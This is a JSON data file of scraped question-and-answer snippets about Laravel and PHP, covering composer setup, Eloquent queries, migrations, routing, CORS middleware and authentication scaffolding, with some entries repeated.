    "description": "composer require laravel/ui    // Generate basic scaffolding... php artisan ui bootstrap php artisan ui vue php artisan ui react  // Generate login / registration scaffolding... php artisan ui bootstrap --auth php artisan ui vue --auth php artisan ui react --auth\ncomposer require laravel/ui\t\t\t// install laravel/ui  // **optional** php artisan ui bootstrap --auth\t\t// login-reg scaffolinding \ncomposer require laravel/ui:^2.4\n",
    "reg_date": "2021-10-12T10:15:29.000Z"
  },
  {
    "id": 2007,
    "keyword": null,
    "link": null,
    "title": " laravel/ui v3.0.0 requires php ^7.3 -> your php version (8.0.2) does not satisfy that requirement.",
    "description": "composer install --ignore-platform-reqs\n#It's becouse in your project in composer.json file you have: \"require\": {     \"php\": \"^7.3\",     ..... },  #try this: \"require\": {     \"php\": \"^7.3|^8.0\",     ..... },\n",
    "reg_date": "2021-10-12T10:15:29.000Z"
  },
  {
    "id": 2008,
    "keyword": null,
    "link": null,
    "title": " laravel: get last id",
    "description": "DB::table('myTable')->orderBy('id','desc')->first();\n",
    "reg_date": "2021-10-12T10:15:29.000Z"
  },
  {
    "id": 2009,
    "keyword": null,
    "link": null,
    "title": " laravel-ckeditor",
    "description": "composer require unisharp/laravel-ckeditor \n",
    "reg_date": "2021-10-12T10:15:29.000Z"
  },
  {
    "id": 2010,
    "keyword": null,
    "link": null,
    "title": " laravel-cors",
    "description": "composer require fruitcake/laravel-cors\n",
    "reg_date": "2021-10-12T10:15:29.000Z"
  },
  {
    "id": 2011,
    "keyword": null,
    "link": null,
    "title": " laravel-medialibrary change name of file",
    "description": "$yourModel->addMedia($pathToFile)->usingName('new name')->toMediaCollection();\n",
    "reg_date": "2021-10-12T10:15:29.000Z"
  },
  {
    "id": 2012,
    "keyword": null,
    "link": null,
    "title": " laravel $loop interation",
    "description": "$loop->iteration =>\tThe current loop iteration (starts at 1).    @foreach ($users as $user) {{$loop->iteration}}   @endforeach\n",
    "reg_date": "2021-10-12T10:15:29.000Z"
  },
  {
    "id": 2013,
    "keyword": null,
    "link": null,
    "title": " laravel : commande introuvable",
    "description": "export PATH=~/.config/composer/vendor/bin:$PATH  source ~/.bashrc\n#in your terminal, edit .bashrc nano ~/.bashrc #pass below command export PATH=\"~/.config/composer/vendor/bin:$PATH\" #save file and restart terminal source ~/.bashrc\n",
    "reg_date": "2021-10-12T10:15:29.000Z"
  },
  {
    "id": 2014,
    "keyword": null,
    "link": null,
    "title": " laravel @canany",
    "description": "# Laravel 5.6+ @canany(['permission1', 'permission2'])   // code @endcanany\n",
    "reg_date": "2021-10-12T10:15:30.000Z"
  },
  {
    "id": 2015,
    "keyword": null,
    "link": null,
    "title": " laravel .htaccess settings",
    "description": "<IfModule mod_rewrite.c> Options +FollowSymLinks RewriteEngine On  RewriteCond %{REQUEST_URI} !^/public/   RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_FILENAME} !-f    RewriteRule ^(.*)$ /public/$1  #RewriteRule ^ index.php [L] RewriteRule ^(/)?$ public/index.php [L]  </IfModule> \nOptions +FollowSymLinks -Indexes  RewriteEngine On  RewriteCond %{HTTP:Authorization}  RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]  RewriteCond %{REQUEST_FILENAME} !-d  RewriteCond %{REQUEST_FILENAME} !-f  RewriteRule ^ index.php [L]\n",
    "reg_date": "2021-10-12T10:15:30.000Z"
  },
  {
    "id": 2016,
    "keyword": null,
    "link": null,
    "title": " laravel 5.4 forelse",
    "description": "@forelse ($users as $user)     <li>{{ $user->name }}</li> @empty     <p>No users</p> @endforelse\n{{ request()->has('faq') ? request()->get('faq') : '' }}\n",
    "reg_date": "2021-10-12T10:15:30.000Z"
  },
  {
    "id": 2017,
    "keyword": null,
    "link": null,
    "title": " laravel 5.8 cors",
    "description": "Create a simple middleware called Cors: php artisan make:middleware Cors    Add the following code to app/Http/Middleware/Cors.php:  public function handle($request, Closure $next) {     return $next($request)         ->header('Access-Control-Allow-Origin', '*')         ->header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS')         ->header('Access-Control-Allow-Headers', 'Origin, Content-Type, Accept, Authorization, X-Request-With'); } You can replace the * with localhost or keep it as it is.  Next step is to load the middleware. Add the following line to the $routeMiddleware array in app/Http/Kernel.php.  'cors' => \\App\\Http\\Middleware\\Cors::class,  And the final step is to use the middleware on the routes to which you want to set the access origin headers. Assuming you are talking about the new api routes in laravel 5.3, the place to do it is app/Providers/RouteServiceProvider.php, inside the mapApiRoutes() function (you can remove or comment the previous code of the function):      Route::group([         'middleware' => ['api', 'cors'],         'namespace' => $this->namespace,         'prefix' => 'api',     ], function ($router) {          //Add you routes here, for example:          Route::apiResource('/posts','PostController');     }); \ncomposer require fruitcake/laravel-cors\n",
    "reg_date": "2021-10-12T10:15:30.000Z"
  },
  {
    "id": 2018,
    "keyword": null,
    "link": null,
    "title": " laravel 5 use env variable in blade",
    "description": "dd(env('APP_NAME'));\nFive most important commands if your Laravel is not working as expected after  some modifications in .env or database folder or because of any other modifications.  Here is full explanation: https://www.youtube.com/watch?v=Q1ynDMC8UGg  php artisan config:clear php artisan cache:clear composer dump-autoload php artisan view:clear php artisan route:clear  After clearup, try \"echo env('URL_BUILDER')\"\n",
    "reg_date": "2021-10-12T10:15:30.000Z"
  },
  {
    "id": 2019,
    "keyword": null,
    "link": null,
    "title": " laravel 6 auth",
    "description": "// How to install Auth in laravel  // With Boothstrap composer require laravel/ui --dev php artisan ui bootstrap --auth npm install && npm run dev  // With VUE composer require laravel/ui --dev php artisan ui vue --auth npm install && npm run dev\ncomposer require laravel/ui  php artisan ui vue --auth  npm install && npm run dev\ncomposer require laravel/ui \"^1.0\" --dev  php artisan ui vue --auth\n// Only for laravel 6.x and higher composer require laravel/ui \"^1.0\" --dev  php artisan ui vue --auth\ncomposer require laravel/ui --dev php artisan ui vue --auth \n//namespace use Illuminate\\Support\\Facades\\Auth;\n",
    "reg_date": "2021-10-12T10:15:30.000Z"
  },
  {
    "id": 2020,
    "keyword": null,
    "link": null,
    "title": " laravel 6 get user id",
    "description": "use Auth; $user_id = Auth::user()->id; \n$id = \\Auth::id();\n",
    "reg_date": "2021-10-12T10:15:30.000Z"
  },
  {
    "id": 2021,
    "keyword": null,
    "link": null,
    "title": " laravel 6 link storage with public",
    "description": "php artisan storage:link\n",
    "reg_date": "2021-10-12T10:15:31.000Z"
  },
  {
    "id": 2022,
    "keyword": null,
    "link": null,
    "title": " laravel 6 make http request",
    "description": "use Illuminate\\Support\\Facades\\Http;  $response = Http::get('http://example.com');  // The get method returns an instance of Illuminate\\Http\\Client\\Response, // which provides a variety of methods that may be used to inspect the response: $response->body() : string; $response->json() : array|mixed; $response->collect() : Illuminate\\Support\\Collection; $response->status() : int; $response->ok() : bool; $response->successful() : bool; $response->failed() : bool; $response->serverError() : bool; $response->clientError() : bool; $response->header($header) : string; $response->headers() : array;\n$client = new GuzzleHttp\\Client(); $res = $client->get('https://api.github.com/user', ['auth' =>  ['user', 'pass']]); echo $res->getStatusCode(); // 200 echo $res->getBody(); // { \"type\": \"User\", ....\n",
    "reg_date": "2021-10-12T10:15:31.000Z"
  },
  {
    "id": 2023,
    "keyword": null,
    "link": null,
    "title": " laravel 6 orderby",
    "description": "$users = DB::table('users')          -> orderBy('name', 'desc')          -> get();\n// Make sure column names are correct $inquiries = Inquiry::orderBy('status', 'ASC')     ->orderBy('created_at', 'DESC')     ->get();  \n$inquiries = Inquiry::all()->sortByDesc('created_at')->sortByDesc('Status')->values(); \n",
    "reg_date": "2021-10-12T10:15:31.000Z"
  },
  {
    "id": 2024,
    "keyword": null,
    "link": null,
    "title": " laravel 6 tymon/jwt-auth",
    "description": "composer require tymon/jwt-auth \n",
    "reg_date": "2021-10-12T10:15:31.000Z"
  },
  {
    "id": 2025,
    "keyword": null,
    "link": null,
    "title": " laravel 7 error npm run dev",
    "description": "rm -rf node_modules rm package-lock.json yarn.lock npm cache clear --force npm install \n",
    "reg_date": "2021-10-12T10:15:31.000Z"
  },
  {
    "id": 2026,
    "keyword": null,
    "link": null,
    "title": " laravel 7 shopping cart tutorial",
    "description": "public function addToCart($id)     {         $product = Product::find($id);           if(!$product) {               abort(404);           }           $cart = session()->get('cart');           // if cart is empty then this the first product         if(!$cart) {               $cart = [                     $id => [                         \"name\" => $product->name,                         \"quantity\" => 1,                         \"price\" => $product->price,                         \"photo\" => $product->photo                     ]             ];               session()->put('cart', $cart);               return redirect()->back()->with('success', 'Product added to cart successfully!');         }           // if cart not empty then check if this product exist then increment quantity         if(isset($cart[$id])) {               $cart[$id]['quantity']++;               session()->put('cart', $cart);               return redirect()->back()->with('success', 'Product added to cart successfully!');           }           // if item not exist in cart then add to cart with quantity = 1         $cart[$id] = [             \"name\" => $product->name,             \"quantity\" => 1,             \"price\" => $product->price,             \"photo\" => $product->photo         ];           session()->put('cart', $cart);           return redirect()->back()->with('success', 'Product added to cart successfully!');     } \n",
    "reg_date": "2021-10-12T10:15:31.000Z"
  },
  {
    "id": 2027,
    "keyword": null,
    "link": null,
    "title": " laravel 7 user registration using api post endpoint",
    "description": "<?php  namespace App\\Http\\Controllers;   use Illuminate\\Http\\Request; use App\\User;  class AuthController extends Controller {     public $loginAfterSignUp = true;      public function register(Request $request)     {       $user = User::create([         'name' => $request->name,         'email' => $request->email,         'password' => bcrypt($request->password),       ]);        $token = auth()->login($user);        return $this->respondWithToken($token);     }      public function login(Request $request)     {       $credentials = $request->only(['email', 'password']);        if (!$token = auth()->attempt($credentials)) {         return response()->json(['error' => 'Unauthorized'], 401);       }        return $this->respondWithToken($token);     }     public function getAuthUser(Request $request)     {         return response()->json(auth()->user());     }     public function logout()     {         auth()->logout();         return response()->json(['message'=>'Successfully logged out']);     }     protected function respondWithToken($token)     {       return response()->json([         'access_token' => $token,         'token_type' => 'bearer',         'expires_in' => auth()->factory()->getTTL() * 60       ]);     }  }  \n",
    "reg_date": "2021-10-12T10:15:31.000Z"
  },
  {
    "id": 2028,
    "keyword": null,
    "link": null,
    "title": " laravel 8 $request->intersect not working",
    "description": "//Instead of this... $request->intersect(['name','description']);  //Try this... $request->only('name','description');\n",
    "reg_date": "2021-10-12T10:15:31.000Z"
  },
  {
    "id": 2029,
    "keyword": null,
    "link": null,
    "title": " laravel 8 Target class [FormController] does not exist.",
    "description": "use App\\Http\\Controllers\\UserController;  Route::get('/users', [UserController::class, 'index']); // or Route::get('/users', 'App\\Http\\Controllers\\UserController@index'); \n//In laravel 8 uncomment  protected $namespace='App\\\\Http\\\\Controllers';\n",
    "reg_date": "2021-10-12T10:15:31.000Z"
  },
  {
    "id": 2030,
    "keyword": null,
    "link": null,
    "title": " laravel 8 authentication tutorial",
    "description": "1. composer create-project laravel/laravel laravel8 8.0 2. composer require laravel/ui 3. php artisan ui vue --auth 4. npm install 5. npm run dev   Now our Laravel 8 auth system is ready to use.  To check authentication is successfully installed or not.  Please browse the links given below.To login check example.com/login To registration check example.com/register  Disable Registration System If you want to disable the new user registration system.  Then go to the web.php route file and change the auth route.  Auth::routes(['register' => false]);\nLaravel's laravel/ui package provides a quick way to scaffold all of the routes and views you need for authentication using a few simple commands:  composer require laravel/ui  php artisan ui vue --auth\ncomposer require laravel/ui php artisan ui vue --auth php artisan migrate\ncomposer require laravel/ui --dev php artisan ui vue --auth \nphp artisan migrate npm install && npm run dev \nnpm run devCopy\n",
    "reg_date": "2021-10-12T10:15:31.000Z"
  },
  {
    "id": 2031,
    "keyword": null,
    "link": null,
    "title": " laravel 8 created at format",
    "description": "$post->created_at->diffForHumans()   /*   Arya Stuck 14 minutes ago   Post something    */\n",
    "reg_date": "2021-10-12T10:15:31.000Z"
  },
  {
    "id": 2032,
    "keyword": null,
    "link": null,
    "title": " laravel 8 db like query",
    "description": "$filterData = DB::table('countries')->where('name','LIKE','%'.$term.'%')                       ->get();\n",
    "reg_date": "2021-10-12T10:15:32.000Z"
  },
  {
    "id": 2033,
    "keyword": null,
    "link": null,
    "title": " laravel 8 delete by id",
    "description": "//For a User table, to delete ID 1:    $user = User::find(1);    $user->delete();  //OR      User::where('id', 1)->delete();  //OR      User::destroy(1);  //OR      User::destroy([1, 2, 3]);  //Delete id 1, 2 and 3\n",
    "reg_date": "2021-10-12T10:15:32.000Z"
  },
  {
    "id": 2034,
    "keyword": null,
    "link": null,
    "title": " laravel 8 foreign key migration",
    "description": "Schema::table('posts', function (Blueprint $table) {     $table->unsignedBigInteger('user_id');      $table->foreign('user_id')->references('id')->on('users'); }); OR Schema::table('posts', function (Blueprint $table) {     $table->foreignId('user_id')->constrained(); });\nTo rollback one step:  php artisan migrate:rollback  To rollback multiple steps:  php artisan migrate:rollback --step=[x]    To drop all tables and reload all migrations:  php artisan migrate:fresh\nSchema::table('posts', function (Blueprint $table) {     $table->unsignedBigInteger('user_id');      $table->foreign('user_id')->references('id')->on('users'); });\nuse Illuminate\\Database\\Schema\\Blueprint; use Illuminate\\Support\\Facades\\Schema;  Schema::table('posts', function (Blueprint $table) {     $table->unsignedBigInteger('user_id');      $table->foreign('user_id')->references('id')->on('users'); });\n",
    "reg_date": "2021-10-12T10:15:32.000Z"
  },
  {
    "id": 2035,
    "keyword": null,
    "link": null,
    "title": " laravel 8 insert multiple rows",
    "description": "$array = [      ['value' => \"value1\", 'status_id' => 1],      ['value' => \"value2\", 'status_id' => 2] ];  ModelName::insert($array); // or DB::table('table_name')->insert($array);\n$data = [     ['user_id'=>'Coder 1', 'subject_id'=> 4096],     ['user_id'=>'Coder 2', 'subject_id'=> 2048],     //... ];  Model::insert($data); // Eloquent approach DB::table('table')->insert($data); // Query Builder approach \n/* It is really easy to do a bulk insert in Laravel with or without the query builder. You can use the following official approach. */   Entity::upsert([     ['name' => 'Pierre Yem Mback', 'city' => 'Eseka', 'salary' => 10000000],     ['name' => 'Dial rock 360', 'city' => 'Yaounde', 'salary' => 20000000],     ['name' => 'Ndibou La Menace', 'city' => 'Dakar', 'salary' => 40000000] ], ['name', 'city'], ['salary']);\n",
    "reg_date": "2021-10-12T10:15:32.000Z"
  },
  {
    "id": 2036,
    "keyword": null,
    "link": null,
    "title": " laravel 8 livewire tutorial",
    "description": "composer require laravel/jetstream\nphp artisan jetstream:install livewire\n",
    "reg_date": "2021-10-12T10:15:32.000Z"
  },
  {
    "id": 2037,
    "keyword": null,
    "link": null,
    "title": " laravel 8 make:auth",
    "description": "// How to install Auth in laravel  // With Boothstrap composer require laravel/ui --dev php artisan ui bootstrap --auth npm install && npm run dev  // With VUE composer require laravel/ui --dev php artisan ui vue --auth npm install && npm run dev\n1. composer create-project laravel/laravel laravel8 8.0 2. composer require laravel/ui 3. php artisan ui vue --auth 4. npm install 5. npm run dev   Now our Laravel 8 auth system is ready to use.  To check authentication is successfully installed or not.  Please browse the links given below.To login check example.com/login To registration check example.com/register  Disable Registration System If you want to disable the new user registration system.  Then go to the web.php route file and change the auth route.  Auth::routes(['register' => false]);\ncomposer require laravel/ui php artisan ui vue --auth php artisan migrate \ncomposer require laravel/ui php artisan ui vue --auth php artisan migrate\ncomposer require laravel/ui --dev php artisan ui vue --auth \nphp artisan migrate npm install && npm run dev \n",
    "reg_date": "2021-10-12T10:15:32.000Z"
  },
  {
    "id": 2038,
    "keyword": null,
    "link": null,
    "title": " laravel 8 make model with migration and controller",
    "description": "php artisan make:model Todo -mcr \nphp artisan make:model Todo -mcfr\nphp artisan make:model ModelName -mcr\nphp artisan make:model Settings --migration \nphp artisan make:model yourModelName --migration\nphp artisan make:model Todo -a\n",
    "reg_date": "2021-10-12T10:15:32.000Z"
  },
  {
    "id": 2039,
    "keyword": null,
    "link": null,
    "title": " laravel 8 php version requirements",
    "description": "PHP >= 7.3 BCMath PHP Extension Ctype PHP Extension Fileinfo PHP Extension JSON PHP Extension Mbstring PHP Extension OpenSSL PHP Extension PDO PHP Extension Tokenizer PHP Extension XML PHP Extension\n",
    "reg_date": "2021-10-12T10:15:32.000Z"
  },
  {
    "id": 2040,
    "keyword": null,
    "link": null,
    "title": " laravel 8 previous page",
    "description": "<a href=\"{{ url()->previous() }}\">Back</a>\n",
    "reg_date": "2021-10-12T10:15:32.000Z"
  },
  {
    "id": 2041,
    "keyword": null,
    "link": null,
    "title": " laravel 8 register with email verification",
    "description": " LARAVEL 8 : ENABLE EMAIL VERIFICATION FOR REGISTRATION -------------------------------------------------------    (1) Modify the Verification controller found in app > Http > Controllers > Auth > VerificationController  *Update below class;  FROM :  Class User Extends Authenticatable { ... }  TO :  Class User Extends Authenticatable implements MustVerifyEmail { ... }   (2) Add the below code in the web.php route file; Auth::routes(['verify' => true]);   (3) Add the below code in the Middleware section of your Controllers $this->middleware(['auth', 'verified']);  Thats all, the next registration will require an email confirmation   \n",
    "reg_date": "2021-10-12T10:15:32.000Z"
  },
  {
    "id": 2042,
    "keyword": null,
    "link": null,
    "title": " laravel 8 route",
    "description": "Route::prefix('admin')->group(function () {     Route::get('/users', function () {         // Matches The \"/admin/users\" URL     }); });\nuse App\\Http\\Controllers\\PagesController;  // Create route for About Page Route::get('about-us', [PagesController::class, 'aboutPage'])->name('pages.about');\nRoute::get(     '/user/profile',     [UserProfileController::class, 'show'] )->name('profile');\n Route::group(['namespace' => 'App\\Http\\Controllers', 'prefix' => 'admin',  'as' => 'admin.', 'middleware' => ['auth:sanctum', 'verified']], function() {     Route::get('/dashboard', ['DashboardController', 'index']); });\nRoute::get('user/{id}/profile', function ($id) {     // })->name('profile');  $url = route('profile', ['id' => 1, 'photos' => 'yes']);  // /user/1/profile?photos=yes\nRoute::get('/novanoticia', 'HomeController@getNovaNoticia')->name('route_name'); Route::get('/novanoticia', ['as' => 'route_name', 'uses' => 'HomeController@getNovaNoticia']); \n",
    "reg_date": "2021-10-12T10:15:32.000Z"
  },
  {
    "id": 2043,
    "keyword": null,
    "link": null,
    "title": " laravel 8 seeding",
    "description": "<?php  namespace Database\\Seeders;  use Illuminate\\Database\\Seeder; use Illuminate\\Support\\Facades\\DB; use Illuminate\\Support\\Facades\\Hash; use Illuminate\\Support\\Str;  class DatabaseSeeder extends Seeder {     /**      * Run the database seeders.      *      * @return void      */     public function run()     {         DB::table('users')->insert([             'name' => Str::random(10),             'email' => Str::random(10).'@gmail.com',             'password' => Hash::make('password'),         ]);     } }\nphp artisan db:seed --force\n/**  * Run the database seeders.  *  * @return void  */ public function run() {     $this->call([         UserSeeder::class,         PostSeeder::class,         CommentSeeder::class,     ]); }\nuse App\\Models\\User;  /**  * Run the database seeders.  *  * @return void  */ public function run() {     User::factory()             ->times(50)             ->hasPosts(1)             ->create(); }\n",
    "reg_date": "2021-10-12T10:15:33.000Z"
  },
  {
    "id": 2044,
    "keyword": null,
    "link": null,
    "title": " laravel 8 try catch",
    "description": "try {    $this->buildXMLHeader();  } catch (\\Exception $e) {      return $e->getMessage(); }\npublic function isValid($value) {     try {         // Validate the value...     } catch (Throwable $e) {         report($e);          return false;     } }\n",
    "reg_date": "2021-10-12T10:15:33.000Z"
  },
  {
    "id": 2045,
    "keyword": null,
    "link": null,
    "title": " laravel 8 validation required if another field is not null",
    "description": "$request->validate([   \"old_password\" =>\"nullable\",   \"new_password\" =>\"confirmed|nullable|different:old_password|required_with:old_password\",   \"password_confirmation\" =>\"nullable|required_with:new_password|required_with:old_password\" ]);\n",
    "reg_date": "2021-10-12T10:15:33.000Z"
  },
  {
    "id": 2046,
    "keyword": null,
    "link": null,
    "title": " laravel 8 websockets",
    "description": "you can watch the full video: https://www.youtube.com/watch?v=rNOGLLPXzwc\nphp artisan websockets:serve \n# https://docs.beyondco.de/laravel-websockets/1.0/getting-started/installation.html\n",
    "reg_date": "2021-10-12T10:15:33.000Z"
  },
  {
    "id": 2047,
    "keyword": null,
    "link": null,
    "title": " laravel APP ENV config",
    "description": "dd(env('APP_NAME'));\nif (\\Illuminate\\Support\\Facades\\App::environment('production')) {     // The environment is production }\n",
    "reg_date": "2021-10-12T10:15:33.000Z"
  },
  {
    "id": 2048,
    "keyword": null,
    "link": null,
    "title": " laravel Call to a member function diffForHumans() on string",
    "description": "// Larvel - call diffForHumans() function on string $date = $info->created_at; {{ \\Carbon\\Carbon::parse($date)->diffForHumans() }}\n",
    "reg_date": "2021-10-12T10:15:33.000Z"
  },
  {
    "id": 2049,
    "keyword": null,
    "link": null,
    "title": " laravel ErrorException Undefined variable:  SESSION",
    "description": "$selected_deal = $req->session()->get('selected_deal');  $selected_deal = session('selected_deal');\n",
    "reg_date": "2021-10-12T10:15:33.000Z"
  },
  {
    "id": 2050,
    "keyword": null,
    "link": null,
    "title": " laravel Filesystem chmod(): Operation not permitted",
    "description": "php artisan route:cache\n",
    "reg_date": "2021-10-12T10:15:33.000Z"
  },
  {
    "id": 2051,
    "keyword": null,
    "link": null,
    "title": " laravel Route::group definition",
    "description": "Route::group(['prefix'=>'accounts','as'=>'account.'], function(){     Route::get('/', 'AccountController@index')->name('index');     Route::get('connect', 'AccountController@connect')->name('connect'); });  Route::group(['prefix'=>'quotes','as'=>'quote.'], function(){     Route::get('/', 'QuoteController@index')->name('index');     Route::get('connect', 'QuoteController@create')->name('create'); });\n",
    "reg_date": "2021-10-12T10:15:33.000Z"
  },
  {
    "id": 2052,
    "keyword": null,
    "link": null,
    "title": " laravel Str::random",
    "description": "use Illuminate\\Support\\Str;  $random = Str::random(40);\n",
    "reg_date": "2021-10-12T10:15:34.000Z"
  },
  {
    "id": 2053,
    "keyword": null,
    "link": null,
    "title": " laravel Your requirements could not be resolved to an installable set of packages.",
    "description": "//Install Necessary PHP Extensions apt-get install php7.4-gmp  apt-get install php-curl sudo apt-get install php7.4-zip sudo apt-get install php-mbstring -y sudo apt-get install php-xml -y //Restart Apache Server sudo service apache2 restart\n",
    "reg_date": "2021-10-12T10:15:34.000Z"
  },
  {
    "id": 2054,
    "keyword": null,
    "link": null,
    "title": " laravel  return view in web.php",
    "description": "Route::get(\"/page\", function(){    return View::make(\"dir.page\"); });\n",
    "reg_date": "2021-10-12T10:15:34.000Z"
  },
  {
    "id": 2055,
    "keyword": null,
    "link": null,
    "title": " laravel access controller method from another controller",
    "description": "// Include the other controller in this controller use App\\Http\\Controllers\\TasksController;  // Instantiate other controller class in this controller's method $tasks_controller = new TasksController; // Use other controller's method in this controller's method $tasks_controller->postNotification($comment_content, $author); \nreturn \\App::call('bla\\bla\\ControllerName@functionName');\n",
    "reg_date": "2021-10-12T10:15:34.000Z"
  },
  {
    "id": 2056,
    "keyword": null,
    "link": null,
    "title": " laravel access dynamic url in middleware",
    "description": "//do this in your middleware public function handle($request, Closure $next) {     dd($request->route()->parameters());     return $next($request); }  //or you can try this  public function handle($request, Closure $next) {   dd($request->route('parameter_name'));     return $next($request); }\n",
    "reg_date": "2021-10-12T10:15:34.000Z"
  },
  {
    "id": 2057,
    "keyword": null,
    "link": null,
    "title": " laravel active menu item",
    "description": "// check using uri <li class=\"{{ request()->is('sites/*/edit') ? 'active' : '' }}\"  // or, check using route name <li class=\"{{ request()->routeIs('sites/*/edit') ? 'active' : '' }}\"   // or, using segment <li class=\"{{ (request()->segment(2) == 'cities') ? 'active' : '' }}\"> \n{{  request()->routeIs('news.*') ? 'active' : '' }}\n",
    "reg_date": "2021-10-12T10:15:34.000Z"
  },
  {
    "id": 2058,
    "keyword": null,
    "link": null,
    "title": " laravel active route check",
    "description": "{{  request()->routeIs('news.*') ? 'active' : '' }}\n",
    "reg_date": "2021-10-12T10:15:34.000Z"
  },
  {
    "id": 2059,
    "keyword": null,
    "link": null,
    "title": " laravel add attribute migration column",
    "description": "php artisan make:migration add_paid_to_users_table --table=users\n",
    "reg_date": "2021-10-12T10:15:34.000Z"
  },
  {
    "id": 2060,
    "keyword": null,
    "link": null,
    "title": " laravel add attribute to model",
    "description": "//The problem is caused by the fact that the Model's toArray() method ignores any accessors which do not directly relate to a column in the underlying table.  //As Taylor Otwell mentioned here, \"This is intentional and for performance reasons.\" However there is an easy way to achieve this:  class EventSession extends Eloquent {      protected $table = 'sessions';     protected $appends = array('availability');      public function getAvailabilityAttribute()     {         return $this->calculateAvailability();       } } // ||| ||| ||| SOURCE HERE // vvv vvv vvv click here for ...\n$user = User::find(1);  // add occupation to user instance $user->setAttribute('occupation', 'Web Developer');\n     public function getAvailabilityAttribute()     {         return $this->calculateAvailability();       }\n",
    "reg_date": "2021-10-12T10:15:34.000Z"
  },
  {
    "id": 2061,
    "keyword": null,
    "link": null,
    "title": " laravel add auto increment",
    "description": "Schema::table('item_tag', function (Blueprint $table) {     $table->increments('id')->first(); });\n",
    "reg_date": "2021-10-12T10:15:34.000Z"
  },
  {
    "id": 2062,
    "keyword": null,
    "link": null,
    "title": " laravel add column migration",
    "description": "php artisan make:migration add_paid_to_users_table --table=users    public function up() {     Schema::table('users', function($table) {         $table->integer('paid');     }); }  public function down() {     Schema::table('users', function($table) {         $table->dropColumn('paid');     }); }  php artisan migrate\npublic function up() {   Schema::table('table', function($table) {     $table->dropColumn('column_name');   }); }\npublic function down() {     Schema::table('users', function($table) {         $table->dropColumn('paid');     }); }\nphp artisan make:migration add_paid_to_users_table --table=users \nphp artisan make:migration create_users_table --create=users  php artisan make:migration add_votes_to_users_table --table=users\nclass AddProfileToUsers extends Migration {     /**      * Run the migrations.      *      * @return void      */     public function up()     {         Schema::table('users', function (Blueprint $table) {             $table->string('profile')->nullable();         });     }      /**      * Reverse the migrations.      *      * @return void      */     public function down()     {         Schema::table('shop_users', function (Blueprint $table) {             $table->dropColumn(['profile']);         });     } }\n",
    "reg_date": "2021-10-12T10:15:34.000Z"
  },
  {
    "id": 2063,
    "keyword": null,
    "link": null,
    "title": " laravel add column to existing table",
    "description": "php artisan make:migration add_paid_to_users_table --table=users    public function up() {     Schema::table('users', function($table) {         $table->integer('paid');     }); }  public function down() {     Schema::table('users', function($table) {         $table->dropColumn('paid');     }); }  php artisan migrate\nphp artisan make:migration add_paid_to_users_table --table=users\npublic function down() {     Schema::table('users', function($table) {         $table->dropColumn('paid');     }); }\nphp artisan make:migration add_paid_to_users_table --table=users \nphp artisan make:migration create_users_table --create=users  php artisan make:migration add_votes_to_users_table --table=users\npublic function up() {     Schema::table('users', function($table) {         $table->integer('paid');     }); }\n",
    "reg_date": "2021-10-12T10:15:35.000Z"
  },
  {
    "id": 2064,
    "keyword": null,
    "link": null,
    "title": " laravel add column to table",
    "description": "php artisan make:migration add_paid_to_users_table --table=users    public function up() {     Schema::table('users', function($table) {         $table->integer('paid');     }); }  public function down() {     Schema::table('users', function($table) {         $table->dropColumn('paid');     }); }  php artisan migrate\nphp artisan make:migration add_paid_to_users_table --table=users\npublic function down() {     Schema::table('users', function($table) {         $table->dropColumn('paid');     }); }\nphp artisan make:migration add_paid_to_users_table --table=users \nSchema::table('users', function (Blueprint $table) { \t$table->dateTime('verify_date')->nullable()->after(\"password_updated_at\"); });\n// The table method on the Schema facade MAY BE USED TO UPDATE EXISTING TABLES. // The table method accepts two arguments: the name of the table and a Closure // that receives a Blueprint instance you may use to add columns to the table: Schema::table('users', function (Blueprint $table) {     $table->string('email'); });\n",
    "reg_date": "2021-10-12T10:15:35.000Z"
  },
  {
    "id": 2065,
    "keyword": null,
    "link": null,
    "title": " laravel add crf token form",
    "description": "<form action=\"{{ url('my-url') }}\">    @csrf\n",
    "reg_date": "2021-10-12T10:15:35.000Z"
  },
  {
    "id": 2066,
    "keyword": null,
    "link": null,
    "title": " laravel add item to array",
    "description": "$arr = [\"1\", \"2\"]; array_push($arr, \"3\");\n$fruits = [\"apple\", \"banana\"]; // array_push() function inserts one or more elements to the end of an array array_push($fruits, \"orange\");  // If you use array_push() to add one element to the array, it's better to use // $fruits[] = because in that way there is no overhead of calling a function. $fruits[] = \"orange\";  // output: Array ( [0] => apple [1] => banana [2] => orange )\n$array = array('foo' => 'bar');  $array = array_add($array, 'key', 'value');\n$myArray = array(\"name\" => \"my name\"); echo json_encode($myArray);\n// array_push ( array &$array [, mixed $... ] ) : int // array_push() treats array as a stack, and pushes the passed variables onto the end of array. The length of array increases by the number of variables pushed. Has the same effect as:  <?php $array[] = $var; ?> // repeated for each passed value. // Note: If you use array_push() to add one element to the array, it's better to use $array[] = because in that way there is no overhead of calling a function.\n",
    "reg_date": "2021-10-12T10:15:35.000Z"
  },
  {
    "id": 2067,
    "keyword": null,
    "link": null,
    "title": " laravel add request",
    "description": "  request()->request->add(['index'=>'value']);\n$request->all() + ['index' => 'value'];\n$request->input('name'); $request->input('user.name'); // fetch from user object\n$request->fullUrl() \n",
    "reg_date": "2021-10-12T10:15:35.000Z"
  },
  {
    "id": 2068,
    "keyword": null,
    "link": null,
    "title": " laravel add timestamps to existing table",
    "description": "$table->dateTime('created_at')->default(DB::raw('CURRENT_TIMESTAMP')); $table->dateTime('updated_at')->nullable(); \n",
    "reg_date": "2021-10-12T10:15:35.000Z"
  },
  {
    "id": 2069,
    "keyword": null,
    "link": null,
    "title": " laravel add user",
    "description": "php artisan tinker DB::table('users')->insert(['name'=>'MyUsername','email'=>'thisis@myemail.com','password'=>Hash::make('123456')])\n",
    "reg_date": "2021-10-12T10:15:35.000Z"
  },
  {
    "id": 2070,
    "keyword": null,
    "link": null,
    "title": " laravel add utility class",
    "description": "# How to register utilities class on Laravel 5.8 # File: composer.json # ref: https://stackoverflow.com/questions/28290332/best-practices-for-custom-helpers-in-laravel-5 \"autoload\": {     \"classmap\": [         ...     ],     \"psr-4\": {         \"App\\\\\": \"app/\"     },     \"files\": [         \"app/helpers.php\" // <---- ADD THIS     ] },    # Then run: `composer dump-autoload`\n",
    "reg_date": "2021-10-12T10:15:35.000Z"
  },
  {
    "id": 2071,
    "keyword": null,
    "link": null,
    "title": " laravel add values to request",
    "description": "  request()->request->add(['index'=>'value']);\n$request->all() + ['index' => 'value'];\n",
